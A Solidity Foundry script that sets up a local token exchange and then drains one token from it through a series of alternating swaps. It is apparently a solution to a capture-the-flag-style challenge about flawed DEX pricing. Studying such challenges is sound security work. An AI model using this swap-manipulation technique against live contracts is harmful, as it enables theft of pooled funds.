pragma solidity ^0.8.0;

import "node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Script} from "forge-std/Script.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";
import {console} from "forge-std/console.sol";


contract deploy is Script
{
    // set up dex for local testing
    function run() external
    {
        vm.startBroadcast();

        Dex dex = new Dex();
        address dexAddr = address(dex);
        console.log("initialized dex at:", dexAddr);

        address player; // address you plan to use when running EmptyDex

        SwappableToken token1 = new SwappableToken(dexAddr, "Token1", "TKN1", 110);
        SwappableToken token2 = new SwappableToken(dexAddr, "Token2", "TKN2", 110);

        address token1Addr = address(token1);
        address token2Addr = address(token2);

        dex.setTokens(token1Addr, token2Addr);

        token1.approve(dexAddr, 100);
        token2.approve(dexAddr, 100);

        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);

        console.log("dex balance tkn1:", token1.balanceOf(dexAddr));
        console.log("dex balance tkn2:", token2.balanceOf(dexAddr));

        token1.transfer(player, 10);
        token2.transfer(player, 10);

        console.log("player balance tkn1:", token1.balanceOf(player));
        console.log("player balance tkn2:", token2.balanceOf(player));

        vm.stopBroadcast();
    }
}

contract EmptyDex is Script
{
    function run() external
    {
        vm.startBroadcast();

        address dexAddr; // instance address
        Dex dex = Dex(dexAddr);
        address token1 = dex.token1();
        address token2 = dex.token2();

        console.log("token1:", token1);
        console.log("token2:", token2);

        dex.approve(dexAddr, 110);

        dex.swap(token1, token2, 10); // swap in the way player only has
        dex.swap(token2, token1, 20); // either tokens1 or tokens2
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45); // until here, player can swap 65 tokens1 at most
                                                     //  but there are only 45 left in the exchange

        // assure token dex token1 balance is 0
        console.log("dex balance:");
        console.log("token1:", ERC20(token1).balanceOf(dexAddr));
        console.log("token2:", ERC20(token2).balanceOf(dexAddr));

        console.log("player balance:");
        console.log("token1:", ERC20(token1).balanceOf(msg.sender));
        console.log("token2:", ERC20(token2).balanceOf(msg.sender));

        vm.stopBroadcast();
    }
}
